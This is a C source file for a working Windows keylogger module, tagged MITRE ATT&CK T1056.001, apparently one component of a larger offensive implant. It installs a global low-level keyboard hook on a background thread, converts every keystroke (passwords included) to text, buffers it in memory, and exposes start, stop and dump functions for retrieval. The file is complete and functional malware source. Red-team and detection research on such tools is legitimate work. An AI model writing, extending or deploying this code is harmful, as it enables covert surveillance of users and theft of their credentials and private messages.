/*
 * keylog.c — Keylogger module (threaded, in-memory buffer)
 *
 * MITRE ATT&CK : T1056.001 — Input Capture: Keylogging
 */

#include <winsock2.h>
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "keylog.h"

#define KEYLOG_BUF_SIZE 65536

static HANDLE  kl_thread  = NULL;
static DWORD   kl_tid     = 0;
static volatile int kl_running = 0;

static CRITICAL_SECTION kl_lock;
static char   kl_buf[KEYLOG_BUF_SIZE];
static int    kl_pos = 0;

static void buf_append(const char *s, int len)
{
    EnterCriticalSection(&kl_lock);
    if (kl_pos + len < KEYLOG_BUF_SIZE - 1) {
        memcpy(kl_buf + kl_pos, s, len);
        kl_pos += len;
        kl_buf[kl_pos] = 0;
    }
    LeaveCriticalSection(&kl_lock);
}

static const char *vk_to_tag(DWORD vk)
{
    switch (vk) {
        case VK_RETURN:  return "\r\n";
        case VK_TAB:     return "[TAB]";
        case VK_BACK:    return "[BS]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:   return "[DEL]";
        case VK_LEFT:    return "[LEFT]";
        case VK_RIGHT:   return "[RIGHT]";
        case VK_UP:      return "[UP]";
        case VK_DOWN:    return "[DOWN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_LSHIFT: case VK_RSHIFT:   return "";
        case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_LMENU: case VK_RMENU:     return "";
        case VK_LWIN: case VK_RWIN:       return "";
        default: return NULL;
    }
}

static LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        const char *tag = vk_to_tag(kbd->vkCode);
        if (tag) {
            int len = (int)strlen(tag);
            if (len > 0)
                buf_append(tag, len);
        } else {
            BYTE kb_state[256] = {0};
            GetKeyboardState(kb_state);
            WCHAR wc[4] = {0};
            int ret = ToUnicode(kbd->vkCode, kbd->scanCode, kb_state, wc, 4, 0);
            if (ret > 0) {
                char mb[8] = {0};
                int mb_len = WideCharToMultiByte(CP_UTF8, 0, wc, ret,
                                                  mb, sizeof(mb), NULL, NULL);
                if (mb_len > 0)
                    buf_append(mb, mb_len);
            } else {
                char hex[8];
                int n = snprintf(hex, sizeof(hex), "[0x%02X]", (unsigned)kbd->vkCode);
                buf_append(hex, n);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static DWORD WINAPI keylog_thread(LPVOID param)
{
    (void)param;

    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
    if (!hook) {
        kl_running = 0;
        return 1;
    }

    MSG msg;
    while (kl_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}

int keylog_start(void)
{
    if (kl_running)
        return -1;

    InitializeCriticalSection(&kl_lock);

    EnterCriticalSection(&kl_lock);
    kl_buf[0] = 0;
    kl_pos    = 0;
    LeaveCriticalSection(&kl_lock);

    kl_running = 1;
    kl_thread  = CreateThread(NULL, 0, keylog_thread, NULL, 0, &kl_tid);
    if (!kl_thread) {
        kl_running = 0;
        DeleteCriticalSection(&kl_lock);
        return -1;
    }

    return 0;
}

int keylog_stop(void)
{
    if (!kl_running)
        return -1;

    kl_running = 0;
    PostThreadMessage(kl_tid, WM_QUIT, 0, 0);
    WaitForSingleObject(kl_thread, 3000);
    CloseHandle(kl_thread);
    kl_thread = NULL;
    kl_tid    = 0;

    DeleteCriticalSection(&kl_lock);
    return 0;
}

char *keylog_dump(void)
{
    if (!kl_running) {
        char *msg = (char *)malloc(32);
        if (msg)
            strcpy(msg, "[keylogger not running]\r\n");
        return msg;
    }

    EnterCriticalSection(&kl_lock);
    int len = kl_pos;
    char *out = (char *)malloc(len + 32);
    if (out) {
        if (len == 0) {
            strcpy(out, "[no keystrokes captured]\r\n");
        } else {
            memcpy(out, kl_buf, len);
            out[len] = '\r';
            out[len + 1] = '\n';
            out[len + 2] = 0;
        }
        kl_buf[0] = 0;
        kl_pos    = 0;
    }
    LeaveCriticalSection(&kl_lock);

    return out;
}
